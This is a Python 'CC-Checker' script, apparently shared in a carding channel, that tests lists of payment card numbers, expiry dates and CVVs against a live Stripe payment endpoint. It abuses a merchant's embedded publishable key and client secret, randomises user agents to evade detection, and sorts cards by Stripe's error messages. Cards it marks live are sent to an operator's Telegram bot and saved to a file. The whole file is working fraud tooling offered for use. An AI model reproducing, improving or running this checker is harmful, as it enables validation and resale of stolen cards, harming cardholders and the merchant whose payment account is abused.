# -*- coding: utf-8 -*-
# script by : @OS74O

try:
	import os,requests,time,telebot,user_agent
except ModuleNotFoundError:
	os.system('pip install time&&pip install requests &&pip install pyTelegramBotAPI&&pip install user_agent&&clear ')

from telebot import TeleBot
from time import sleep
from requests import (get,post)
import requests as r
from user_agent import generate_user_agent

#colors=[]
R="\033[1;31m"# Red
G="\033[1;32m" # Green
Y="\033[1;33m"# Yellow
B="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White

os74 = f'''{G}
{W} .d88888b.   .d8888b.  
{G}d88P" "Y88b d88P  Y88b 
{W}888     888 Y88b.      
{G}888     888  "Y888b.   
{W}888     888     "Y88b. 
{G}888     888       "888 
{W}Y88b. .d88P Y88b  d88P 
{G} "Y88888P"   "Y8888P"           
  
                                         
{W}[ {G}CC-Checker v2{W} ]
{W}---------------------------
{G}|{W} [ {G}Author {W}] : {G}@OS74O     |
| {W}[ {G}Tele {W}] : {G}@OS74_Tools  |
| {W}[{G} YT{W} ]   : {G} TECHNO ZONE |
| {W}[{G} Gate{W} ]  : {G}Stripe 10$  |
{W}---------------------------
'''
print            ((((((((((((os74))))))))))))
print()
token = input(G+f' [{W}Token{G}] =>{W} ')
print()
anything=True
ID = input(G+f' [{W}ID{G}] => {W}')
print("")
bot=TeleBot(token)
os.system('clear')
print             ((((((((((((os74))))))))))))
print()
file = input(G+f' [{W}Combo{G}] => {W}')
if file:
	try:
		op=open(file,'r')
	except Exception as error:
		print('\n- The file name is wrong  or the path was not found [×] \n')
		print('-system : ' ,error)
		time.sleep(2)
		os.system('clear')
		print             ((((((((((((os74))))))))))))
		file=input(G+f' [{W}Combo{G}] => {W}')
		try:
			op=open(file,'r')
			pass
		except:
			exit('\n- shit [!] ')

elif file==str('') or int() or bool():
	os.system('clear')
print();print();print();
#------------------#
#-------OS74-------#
#------------------#
def request(author):
	while True:
		card=op.readline().split('\n')[0]
		cn=card.split('|')[0]
		mm=card.split('|')[1] 
		yy=card.split('|')[2]
		cvv=card.split('|')[3]
		bin=cn[:6]
		ua=str(generate_user_agent())
		
		h={'Host':'api.stripe.com',
'content-length':'765',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
'accept':'application/json',
'content-type':'application/x-www-form-urlencoded',
'accept-language':'en-GB,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-US;q=0.6',
'sec-ch-ua-mobile':'?1',
'user-agent':ua,
'sec-ch-ua-platform':'"Android"',
'origin':'https://js.stripe.com',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://js.stripe.com/',
'accept-encoding':'gzip, deflate, br'}
		u='https://api.stripe.com/v1/payment_intents/pi_3N76v4DtRtSgwfv526AvJnYY/confirm'
		d=f"payment_method_data[type]=card&payment_method_data[card][number]={cn}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[billing_details][address][postal_code]=90001&payment_method_data[guid]=3b4b4e71-84d9-4803-b749-28f8985b0b9c36b076&payment_method_data[muid]=687b85f4-3a3a-4621-b143-ed5633295aae4f971e&payment_method_data[sid]=e8c7d2c0-23dc-47cd-bf12-a68a35123a3f8599fc&payment_method_data[payment_user_agent]=stripe.js%2F4fa8c9826f%3B+stripe-js-v3%2F4fa8c9826f&payment_method_data[time_on_page]=102449&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_SbOhR0mPK55dMckhtbSufjdM&client_secret=pi_3N76v4DtRtSgwfv526AvJnYY_secret_PrDqYfazcgZxVWD0lxg2t8mna"
		sleep(0.9)
		req=r.post(u,data=d,headers=h).json()
		try:
			mes=req['error']['message']
			if mes=='Your card does not support this type of purchase.':
				print(G,card,' :',' Approved✅')
				oss=(f"""
╔━━━━━𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐂━━━━╗ 

 ⌯ 𝐂𝐂 : <code>{card}</code>
 
 ⌯ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 : 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
 
 ⌯ 𝐒𝐓𝐀𝐓𝐔𝐒 : {mes}
 
╚━━━━━━━━━━━━━━━╝
 ⌯ 𝐣𝐨𝐢𝐧 : @OS74_TOOLS
""")
				bot.send_message(ID,f'<strong>{oss}</strong>',parse_mode='html')
				with open('Approved-cc.txt','a+') as hit:
					hit.write(f'{card}\n')
			if mes=='Your card has insufficient funds.':
				print(G,card,' :',' Approved✅')
				oss=(f"""
╔━━━━━𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐂━━━━╗ 

 ⌯ 𝐂𝐂 : <code>{card}</code>
 
 ⌯ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 : 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
 
 ⌯ 𝐒𝐓𝐀𝐓𝐔𝐒 : {mes}
 
╚━━━━━━━━━━━━━━━╝
 ⌯ 𝐣𝐨𝐢𝐧 : @OS74_TOOLS
""")
				bot.send_message(ID,f'<strong>{oss}</strong>',parse_mode='html')
				with open('Approved-cc.txt','a+') as hit:
					hit.write(f'{card}\n')
				
			if mes=="Your card's security code is incorrect.":
				print(G,card,' :',' Approved✅')
				oss=(f"""
╔━━━━━𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐂━━━━╗ 

 ⌯ 𝐂𝐂 : <code>{card}</code>
 
 ⌯ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 : 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
 
 ⌯ 𝐒𝐓𝐀𝐓𝐔𝐒 : {mes}
 
╚━━━━━━━━━━━━━━━╝
 ⌯ 𝐣𝐨𝐢𝐧 : @OS74_TOOLS
""")
				bot.send_message(ID,f'<strong>{oss}</strong>',parse_mode='html')
				with open('Approved-cc.txt','a+') as hit:
					hit.write(f'{card}\n')
				
			if mes=='Your card was declined.':
				print(R,card,' :',' Declined❌')
			if mes=="Your card's expiration month is invalid.":
				print(R,card,' :',' Declined❌')
			if mes=="Your card's expiration year is invalid.":
				print(R,card,' :',' Declined❌')
		except:
			if 'confirmation_challenge' in req:
				print(G,card,' :',' OTP✅')
				oss=(f"""
╔━━━━━𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐂━━━━╗ 

 ⌯ 𝐂𝐂 : <code>{card}</code>
 
 ⌯ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 : 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
 
 ⌯ 𝐒𝐓𝐀𝐓𝐔𝐒 : OTP ✅
 
╚━━━━━━━━━━━━━━━╝
 ⌯ 𝐣𝐨𝐢𝐧 : @OS74_TOOLS
""")
				bot.send_message(ID,f'<strong>{oss}</strong>',parse_mode='html')
				with open('Approved-cc.txt','a+') as hit:
					hit.write(f'{card}\n')
			
		
		
		
		
request('#- script by @OS74O ')
